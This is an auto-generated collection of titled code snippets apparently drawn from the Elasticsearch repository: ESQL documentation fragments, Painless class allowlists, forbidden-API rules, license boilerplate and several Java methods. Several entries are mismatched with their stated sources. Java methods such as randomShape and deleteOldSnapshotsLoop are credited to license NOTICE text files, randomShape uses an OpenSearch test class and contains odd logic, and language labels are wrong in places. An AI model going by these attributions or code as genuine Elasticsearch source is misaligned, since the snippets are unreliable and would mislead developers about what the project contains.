owner]\n\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n   distributed under the License is distributed on an \"AS IS\" BASIS,\n   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n   See the License for the specific language governing permissions and\n   limitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Defining Parameters for ESQL Numeric Function\nDESCRIPTION: Specifies the parameters for an ESQL numeric function. It defines a single parameter 'number' which is a numeric expression. The function returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/cbrt.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`number`\n:   Numeric expression. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: Preventing DNS Lookup in InetSocketAddress\nDESCRIPTION: Recommends using getHostString() instead of getHostName() to avoid unnecessary DNS lookups.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/jdk-signatures.txt#2025-04-21_snippet_10\n\nLANGUAGE: plaintext\nCODE:\n```\njava.net.InetSocketAddress#getHostName() @ Use getHostString() instead, which avoids a DNS lookup\n```\n\n----------------------------------------\n\nTITLE: Function Documentation Structure - Markdown\nDESCRIPTION: Documentation structure for the EXP function including sections for syntax, parameters, description, types and examples using Sphinx-style includes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/exp.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n## `EXP` [esql-exp]\n\n**Syntax**\n\n:::{image} ../../../images/functions/exp.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/exp.md\n:::\n\n:::{include} ../description/exp.md\n:::\n\n:::{include} ../types/exp.md\n:::\n\n:::{include} ../examples/exp.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Deprecated HTTP Entity Constructor Rules\nDESCRIPTION: Specifies HTTP entity constructors that are deprecated and should not be used. Developers should use non-deprecated alternatives.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/forbidden/http-signatures.txt#2025-04-21_snippet_1\n\nLANGUAGE: text\nCODE:\n```\norg.apache.http.nio.entity.NFileEntity#<init>(java.io.File,java.lang.String)\norg.apache.http.nio.entity.NFileEntity#<init>(java.io.File,java.lang.String,boolean)\norg.apache.http.entity.FileEntity#<init>(java.io.File,java.lang.String)\norg.apache.http.entity.StringEntity#<init>(java.lang.String,java.lang.String,java.lang.String)\n```\n\n----------------------------------------\n\nTITLE: Including Apache License Boilerplate Notice\nDESCRIPTION: This snippet details how to properly apply the Apache License to your work, providing boilerplate text to be included with your copyright notice, ensuring compliance with the License.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/apm/licenses/elastic-apm-agent-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nCopyright {yyyy} {name of copyright owner}\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Java Text Package Class Definitions\nDESCRIPTION: Detailed class specifications from the java.text package, including text formatting, localization, and internationalization classes with their methods and constants.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.text.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nclass java.text.Annotation {\n  (Object)\n  def getValue()\n}\n\nclass java.text.AttributedCharacterIterator$Attribute {\n  AttributedCharacterIterator.Attribute INPUT_METHOD_SEGMENT\n  AttributedCharacterIterator.Attribute LANGUAGE\n  AttributedCharacterIterator.Attribute READING\n}\n\nclass java.text.AttributedString {\n  (String)\n  (String,Map)\n  void addAttribute(AttributedCharacterIterator.Attribute,Object)\n  void addAttribute(AttributedCharacterIterator.Attribute,Object,int,int)\n  void addAttributes(Map,int,int)\n  AttributedCharacterIterator getIterator()\n  AttributedCharacterIterator getIterator(AttributedCharacterIterator.Attribute[])\n  AttributedCharacterIterator getIterator(AttributedCharacterIterator.Attribute[],int,int)\n}\n```\n\n----------------------------------------\n\nTITLE: Markdown Warning Block for Index Settings\nDESCRIPTION: A warning message about changing undocumented index settings on closed indices, formatted in markdown using a warning directive.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/index.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n::::{warning}\nYou can change any documented index settings on closed indices. However, changing undocumented index settings on closed indices is unsupported and might result in errors.\n::::\n```\n\n----------------------------------------\n\nTITLE: Generating Random Shapes in Java for Elasticsearch Geo Testing\nDESCRIPTION: This method creates a random shape for geospatial testing in Elasticsearch. It generates either a point, line, polygon, or multipolygon based on a random selection. The method uses various helper functions to create these shapes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/esql/arrow/licenses/checker-qual-NOTICE.txt#2025-04-22_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\npublic static Object randomShape() {\n    Objects.requireNonNull(randomLongitude());\n    Objects.requireNonNull(randomPoint());\n    Objects.requireNonNull(randomPolygon());\n    Objects.requireNonNull(randomLine());\n    Objects.requireNonNull(randomMultiLine());\n    Objects.requireNonNull(randomMultiPolygon());\n    double rand = OpenSearchTestCase.randomDouble();\n    if (rand < 0.1) {\n        return randomPoint();\n    } else if (rand < 0.2) {\n        return randomLine();\n    } else if (rand < 0.3) {\n        return randomPolygon((0.0 == OpenSearchTestCase.randomDouble()) ? null : randomPolygon());\n    } else if (rand < 0.4) {\n        if (OpenSearchTestCase.randomBoolean()) {\n            return randomMultiLine();\n        } else {\n            return randomMultiPolygon();\n        }\n    }\n    return randomGeometryCollectionWithCircle();\n}\n```\n\n----------------------------------------\n\nTITLE: Including Multiplication Type Information in Markdown\nDESCRIPTION: This snippet includes external markdown content containing type information for the multiplication operator in ESQL. It's likely to provide details on input types and return types for the multiplication operation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/layout/mul.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../types/mul.md\n:::\n```\n\n----------------------------------------\n\nTITLE: SHA1 Hash Function Documentation Comment\nDESCRIPTION: Auto-generated documentation header for a SHA1 hash function implementation in Elasticsearch. The comment indicates this is machine-generated content that should not be manually edited.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/sha1.md#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Description**\n\nComputes the SHA1 hash of the input.\n```\n\n----------------------------------------\n\nTITLE: ESQL Function Documentation Comment\nDESCRIPTION: Generated documentation header for the cosine function implementation, including a warning about manual edits and a link to mathematical reference.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/cos.md#2025-04-21_snippet_0\n\nLANGUAGE: plaintext\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Adding Documents to Elasticsearch Index for Version 5 in JSON\nDESCRIPTION: Inserts a document into the Elasticsearch index for version 5, including title, content, and created_at fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/qa/repository-old-versions-compatibility/src/javaRestTest/resources/README.md#2025-04-21_snippet_8\n\nLANGUAGE: json\nCODE:\n```\nPOST /index/my_type\n{\n  \"title\": \"Title 5\",\n  \"content\": \"Elasticsearch is a powerful search engine.\",\n  \"created_at\": \"2024-12-16\"\n}\n```\n\n----------------------------------------\n\nTITLE: Documentation Template for ESQL Geometry Parameter in LaTeX\nDESCRIPTION: A LaTeX documentation template for an ESQL function that accepts a geometry parameter. The template indicates the parameter accepts expressions of type geo_point, geo_shape, cartesian_point, or cartesian_shape, and returns null when the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/st_envelope.md#2025-04-21_snippet_0\n\nLANGUAGE: latex\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n**Parameters**\n\n`geometry`\n:   Expression of type `geo_point`, `geo_shape`, `cartesian_point` or `cartesian_shape`. If `null`, the function returns `null`.\n```\n\n----------------------------------------\n\nTITLE: TO_AGGREGATE_METRIC_DOUBLE Function Availability Declaration in Markdown\nDESCRIPTION: Defines the availability status of the TO_AGGREGATE_METRIC_DOUBLE function across different Elasticsearch deployment models, indicating it is 'COMING' for the product version and 'GA' (Generally Available) for serverless deployments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_aggregate_metric_double.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n```{applies_to}\nproduct: COMING\nserverless: GA\n```\n```\n\n----------------------------------------\n\nTITLE: Documenting ESQL Function Parameters in Markdown\nDESCRIPTION: This code snippet defines the parameters for an ESQL function using markdown syntax. It specifies a single parameter 'field' which is an expression used for categorization.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/parameters/categorize.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Parameters**\n\n`field`\n:   Expression to categorize\n```\n\n----------------------------------------\n\nTITLE: Including SUBSTRING Function Description in Markdown\nDESCRIPTION: This snippet uses Markdown syntax to include the description section for the SUBSTRING function from an external file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/substring.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../description/substring.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Ceph Cluster Monitoring Configuration\nDESCRIPTION: Metric paths for monitoring Ceph storage clusters including disk usage, cluster health, performance statistics, and OSD (Object Storage Daemon) metrics.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/test/framework/src/main/resources/org/elasticsearch/common/xcontent/support/many_filters.txt#2025-04-22_snippet_5\n\nLANGUAGE: plaintext\nCODE:\n```\nceph.cluster_disk.available.bytes\nceph.cluster_disk.total.bytes\nceph.cluster_health.overall_status\nceph.cluster_status.degraded.objects\nceph.mgr_osd_perf.stats.commit_latency_ms\n```\n\n----------------------------------------\n\nTITLE: Running Spotless Check on Specific Subproject\nDESCRIPTION: Gradle command demonstrating how to run the Spotless formatting check on a specific subproject (in this case, the 'server' module) rather than the entire codebase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/CONTRIBUTING.md#2025-04-21_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew server:spotlessJavaCheck\n```\n\n----------------------------------------\n\nTITLE: Defining Serbian Stop Words\nDESCRIPTION: Lists Serbian stop words for use in Elasticsearch, directing to the corresponding Lucene stop words document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_34\n\nLANGUAGE: markdown\nCODE:\n```\n`_serbian_`\n:   [Serbian stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/sr/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: Defining Dutch Stop Words\nDESCRIPTION: Defines Dutch stop words for use in Elasticsearch, with links to the relevant Lucene text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_14\n\nLANGUAGE: markdown\nCODE:\n```\n`_dutch_`\n:   [Dutch stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/snowball/dutch_stop.txt)\n```\n\n----------------------------------------\n\nTITLE: Apache License 2.0 Boilerplate Notice Template\nDESCRIPTION: Template text for applying the Apache License 2.0 to software projects. Includes placeholders for copyright year and owner information, along with standard license reference and disclaimer text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/discovery-azure-classic/licenses/javax.inject-LICENSE.txt#2025-04-22_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Defining ArrayIndexOutOfBoundsException in Java\nDESCRIPTION: This snippet defines the java.lang.ArrayIndexOutOfBoundsException class, thrown when an attempt is made to access an array with an illegal index. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_27\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.ArrayIndexOutOfBoundsException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Including MAX Function Description in Markdown\nDESCRIPTION: This snippet includes the content of a markdown file containing the description of the MAX function.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/max.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../description/max.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Deleting Old Snapshots Loop in Elasticsearch Repository\nDESCRIPTION: This private method implements the loop for deleting old snapshots. It recursively calls itself to handle pagination and retries failed deletions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/inference/licenses/slf4j-NOTICE.txt#2025-04-22_snippet_1\n\nLANGUAGE: Java\nCODE:\n```\nprivate void deleteOldSnapshotsLoop(\n        String repoName,\n        long beforeTimestamp,\n        int batchSize,\n        AtomicBoolean hasMore,\n        AtomicReference<String> lastSeenName,\n        AtomicInteger deleted,\n        AtomicInteger failed,\n        ActionListener<DeleteSnapshotResult> listener\n    ) {\n        if (hasMore.get() == false) {\n            listener.onResponse(new DeleteSnapshotResult(deleted.get()));\n            return;\n        }\n        final GetSnapshotsRequest getSnapshotsRequest = new GetSnapshotsRequest(repoName);\n        getSnapshotsRequest.snapshots(GetSnapshotsRequest.ALL_SNAPSHOTS);\n        getSnapshotsRequest.ignoreUnavailable(true);\n        getSnapshotsRequest.setAfter(lastSeenName.get());\n        getSnapshotsRequest.size(batchSize);\n\n        client.admin()\n            .cluster()\n            .getSnapshots(getSnapshotsRequest, ActionListener.wrap(getSnapshotsResponse -> {\n                final List<SnapshotInfo> snapshots = getSnapshotsResponse.getSnapshots();\n                hasMore.set(snapshots.size() == batchSize);\n                if (snapshots.isEmpty()) {\n                    deleteOldSnapshotsLoop(\n                        repoName,\n                        beforeTimestamp,\n                        batchSize,\n                        hasMore,\n                        lastSeenName,\n                        deleted,\n                        failed,\n                        listener\n                    );\n                    return;\n                }\n                lastSeenName.set(snapshots.get(snapshots.size() - 1).snapshotId().getName());\n\n                final List<SnapshotId> toDelete = snapshots.stream()\n                    .filter(s -> s.startTime() < beforeTimestamp)\n                    .map(SnapshotInfo::snapshotId)\n                    .collect(Collectors.toList());\n\n                if (toDelete.isEmpty()) {\n                    deleteOldSnapshotsLoop(\n                        repoName,\n                        beforeTimestamp,\n                        batchSize,\n                        hasMore,\n                        lastSeenName,\n                        deleted,\n                        failed,\n                        listener\n                    );\n                    return;\n                }\n\n                deleteSnapshots(repoName, toDelete, ActionListener.wrap(deleteSnapshotsResponse -> {\n                    deleted.addAndGet(toDelete.size());\n                    deleteOldSnapshotsLoop(\n                        repoName,\n                        beforeTimestamp,\n                        batchSize,\n                        hasMore,\n                        lastSeenName,\n                        deleted,\n                        failed,\n                        listener\n                    );\n                }, e -> {\n                    if (ExceptionsHelper.unwrap(e, ConcurrentSnapshotExecutionException.class) != null) {\n                        // TODO: retry individual conflicting snapshots and not fail the whole batch\n                        failed.addAndGet(toDelete.size());\n                        deleteOldSnapshotsLoop(\n                            repoName,\n                            beforeTimestamp,\n                            batchSize,\n                            hasMore,\n                            lastSeenName,\n                            deleted,\n                            failed,\n                            listener\n                        );\n                    } else {\n                        listener.onFailure(e);\n                    }\n                }));\n            }, listener::onFailure));\n    }\n```\n\n----------------------------------------\n\nTITLE: Event Handling with EventObject in Java\nDESCRIPTION: This snippet defines the EventObject class, which serves as a base class for event handling in Java. It includes the event source information that can be retrieved when an event occurs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.txt#2025-04-21_snippet_15\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.EventObject {\n  (Object)\n  Object getSource()\n}\n```\n\n----------------------------------------\n\nTITLE: Defining DoubleStream Interface in Painless - Java\nDESCRIPTION: Specifies the DoubleStream interface, which provides methods to handle streams of double values. It includes various operations such as filtering, mapping, reducing, and collecting in a double-specific manner.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.util.stream.txt#2025-04-21_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\nclass java.util.stream.DoubleStream {\n  boolean allMatch(DoublePredicate)\n  boolean anyMatch(DoublePredicate)\n  OptionalDouble average()\n  Stream boxed()\n  DoubleStream.Builder builder()\n  def collect(Supplier,ObjDoubleConsumer,BiConsumer)\n  DoubleStream concat(DoubleStream,DoubleStream)\n  long count()\n  DoubleStream distinct()\n  DoubleStream empty()\n  DoubleStream filter(DoublePredicate)\n  OptionalDouble findAny()\n  OptionalDouble findFirst()\n  DoubleStream flatMap(DoubleFunction)\n  void forEach(DoubleConsumer)\n  void forEachOrdered(DoubleConsumer)\n  PrimitiveIterator.OfDouble iterator()\n  DoubleStream limit(long)\n  DoubleStream map(DoubleUnaryOperator)\n  IntStream mapToInt(DoubleToIntFunction)\n  LongStream mapToLong(DoubleToLongFunction)\n  Stream mapToObj(DoubleFunction)\n  OptionalDouble max()\n  OptionalDouble min()\n  boolean noneMatch(DoublePredicate)\n  DoubleStream of(double[])\n  DoubleStream peek(DoubleConsumer)\n  OptionalDouble reduce(DoubleBinaryOperator)\n  double reduce(double,DoubleBinaryOperator)\n  DoubleStream sequential()\n  DoubleStream skip(long)\n  DoubleStream sorted()\n  Spliterator.OfDouble spliterator()\n  double sum()\n  DoubleSummaryStatistics summaryStatistics()\n  double[] toArray()\n}\n```\n\n----------------------------------------\n\nTITLE: Including ACOS Function Documentation Sections in Markdown\nDESCRIPTION: This snippet demonstrates the use of Markdown include directives to compose the ACOS function documentation from separate files.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/acos.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../parameters/acos.md\n:::\n\n:::{include} ../description/acos.md\n:::\n\n:::{include} ../types/acos.md\n:::\n\n:::{include} ../examples/acos.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Copyright notice template for Apache 2.0\nDESCRIPTION: This snippet provides the template for the copyright notice to be used when applying the Apache License 2.0 to a project.  The user needs to replace the bracketed placeholders with the correct year and copyright owner's name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/discovery-azure-classic/licenses/commons-logging-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Text\nCODE:\n```\n\"Copyright [yyyy] [name of copyright owner]\"\n```\n\n----------------------------------------\n\nTITLE: Including SIN Function Description in Markdown\nDESCRIPTION: This snippet includes the description documentation for the SIN function from a separate markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/sin.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../description/sin.md\n:::\n```\n\n----------------------------------------\n\nTITLE: RTRIM Function Section\nDESCRIPTION: Main section defining the RTRIM function documentation with reference to syntax diagram and included content sections.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/rtrim.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n## `RTRIM` [esql-rtrim]\n\n**Syntax**\n\n:::{image} ../../../images/functions/rtrim.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/rtrim.md\n:::\n\n:::{include} ../description/rtrim.md\n:::\n\n:::{include} ../types/rtrim.md\n:::\n\n:::{include} ../examples/rtrim.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Annotation for Deprecated API Parameters\nDESCRIPTION: This JSON snippet specifies how to annotate deprecated parameters in an API, with fields for deprecation version and explanation incorporated.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/rest-api-spec/README.markdown#2025-04-21_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"api\": {\n    \"url\": {\n      \"params\": {\n        \"stored_fields\": {\n          \"type\": \"list\",\n          \"description\" : \"\",\n          \"deprecated\" : {\n            \"version\" : \"7.0.0\",\n            \"description\" : \"Reason parameter is being deprecated\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ST_WITHIN Function Documentation Structure\nDESCRIPTION: Main documentation structure for the ST_WITHIN spatial function, including references to included documentation fragments and an SVG diagram.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/st_within.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `ST_WITHIN` [esql-st_within]\n\n**Syntax**\n\n:::{image} ../../../images/functions/st_within.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/st_within.md\n:::\n\n:::{include} ../description/st_within.md\n:::\n\n:::{include} ../types/st_within.md\n:::\n\n:::{include} ../examples/st_within.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Including Examples for LOG Function\nDESCRIPTION: This snippet includes usage examples for the LOG function from an external markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/log.md#2025-04-21_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../examples/log.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Applying GPLv2 to a New Program (C/C++)\nDESCRIPTION: These are the standard notices that should be included at the start of each source file to apply the GNU General Public License v2 to a new program. This includes a copyright statement, a declaration that the program is free software under GPLv2 (or later), a disclaimer of warranty, and instructions on obtaining a copy of the license.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-zip-commons-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: C/C++\nCODE:\n```\n    \"One line to give the program's name and a brief idea of what it does.\\n    Copyright (C) <year> <name of author>\\n\\n    This program is free software; you can redistribute it and/or modify\\n    it under the terms of the GNU General Public License as published by\\n    the Free Software Foundation; either version 2 of the License, or\\n    (at your option) any later version.\\n\\n    This program is distributed in the hope that it will be useful, but\\n    WITHOUT ANY WARRANTY; without even the implied warranty of\\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU\\n    General Public License for more details.\\n\\n    You should have received a copy of the GNU General Public License\\n    along with this program; if not, write to the Free Software\\n    Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1335 USA\"\n```\n\n----------------------------------------\n\nTITLE: Apache License Boilerplate Notice Template\nDESCRIPTION: Standard boilerplate notice template for applying Apache License 2.0 to software projects. Includes placeholders for copyright year and owner information, along with the standard license declaration and conditions text.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/plugins/discovery-azure-classic/licenses/commons-codec-LICENSE.txt#2025-04-21_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nCopyright [yyyy] [name of copyright owner]\n\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License.\n```\n\n----------------------------------------\n\nTITLE: Implementing BucketScriptPipelineAggregator Calculate Method in Java\nDESCRIPTION: This method calculates new values for buckets by evaluating a script with values extracted from parent buckets. It handles bucket paths, extracts values from parent aggregations, and evaluates scripts for each bucket position.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/gax-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\n@Override\nprotected double[] calculate(Map<String, Object>[] subAggregationResults, InternalMultiBucketAggregation.InternalBucket[][] buckets) {\n    double[] values = new double[buckets.length];\n    for (int i = 0; i < buckets.length; i++) {\n        Map<String, Object> vars = new HashMap<>(script.getParams());\n        if (pathsAsMap.isEmpty()) {\n            // Presumably, the script does not access any bucket variables.\n            runScript(vars, values, i);\n        } else {\n            Map<String, Object> selectedSubAggregationResults = subAggregationResults[i];\n            if (selectedSubAggregationResults == null) {\n                // There is no data for the bucket so we will delegate to the script and see what it prefers to do here.\n                // We should notify the script that there is no data available for the current bucket by not setting any variables\n                runScript(vars, values, i);\n            } else {\n                for (Map.Entry<String, String> entry : pathsAsMap.entrySet()) {\n                    String varName = entry.getKey();\n                    String[] path = entry.getValue().split(\"\\\\.\");\n                    if (path.length == 0) {\n                        // should not happen but if it does the user doesn't\n                        // get access to the parent agg's buckets\n                        continue;\n                    }\n                    String bucketAggName = path[0];\n                    Object propertyValue = selectedSubAggregationResults.get(bucketAggName);\n                    if (propertyValue == null) {\n                        continue;\n                    }\n\n                    // navigate value extractors through the path of value extractors,\n                    // but excluding the last, which relates to the metric itself\n                    for (int j = 1; j < path.length - 1; j++) {\n                        String pathElement = path[j];\n                        propertyValue = ((Map<String, Object>) propertyValue).get(pathElement);\n                        if (propertyValue == null) {\n                            break;\n                        }\n                    }\n\n                    // extract value from metric\n                    if (propertyValue != null && path.length > 1) {\n                        String metricName = path[path.length - 1];\n                        propertyValue = ((Map<String, Object>) propertyValue).get(metricName);\n                        if (propertyValue == null) {\n                            vars.put(varName, Double.NaN);\n                        } else if (propertyValue instanceof Number) {\n                            vars.put(varName, ((Number) propertyValue).doubleValue());\n                        } else {\n                            vars.put(varName, propertyValue);\n                        }\n                    } else {\n                        if (propertyValue instanceof Number) {\n                            vars.put(varName, ((Number) propertyValue).doubleValue());\n                        } else {\n                            vars.put(varName, Double.NaN);\n                        }\n                    }\n                }\n                runScript(vars, values, i);\n            }\n        }\n    }\n    return values;\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Multiple Backported Transport Changes in Java (8.14 Example)\nDESCRIPTION: This Java code snippet, from an 8.14 pull request example, shows how to check for multiple transport versions related to backports. It uses `isPatchFrom` to check if the version corresponds to the 8.13 backport (`8.13_backport_id`) and `onOrAfter` for the 8.14 backport ID (`8.14_backport_id`). This handles scenarios where a branch needs to be aware of backports in previous versions as well as its own.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/internal/Versioning.md#_snippet_2\n\nLANGUAGE: Java\nCODE:\n```\nif (transportVersion.isPatchFrom(8.13_backport_id)\n    || transportVersion.onOrAfter(8.14_backport_id))\n```\n\n----------------------------------------\n\nTITLE: Defining IndexOutOfBoundsException in Java\nDESCRIPTION: This snippet defines the java.lang.IndexOutOfBoundsException class, thrown to indicate that an index of some sort (such as to an array, string, or vector) is out of range. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_39\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.IndexOutOfBoundsException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ChronoLocalDate Interface\nDESCRIPTION: Interface definition for ChronoLocalDate that represents a date without time components in an arbitrary chronology system. Includes methods for date manipulation, comparison and formatting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.chrono.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.chrono.ChronoLocalDate {\n  ChronoLocalDateTime atTime(LocalTime)\n  int compareTo(ChronoLocalDate)\n  boolean equals(Object)\n  String format(DateTimeFormatter)\n  ChronoLocalDate from(TemporalAccessor)\n  Chronology getChronology()\n  Era getEra()\n  int hashCode()\n  boolean isAfter(ChronoLocalDate)\n  boolean isBefore(ChronoLocalDate)\n  boolean isEqual(ChronoLocalDate)\n  boolean isLeapYear()\n  int lengthOfMonth()\n  int lengthOfYear()\n  ChronoLocalDate minus(TemporalAmount)\n  ChronoLocalDate 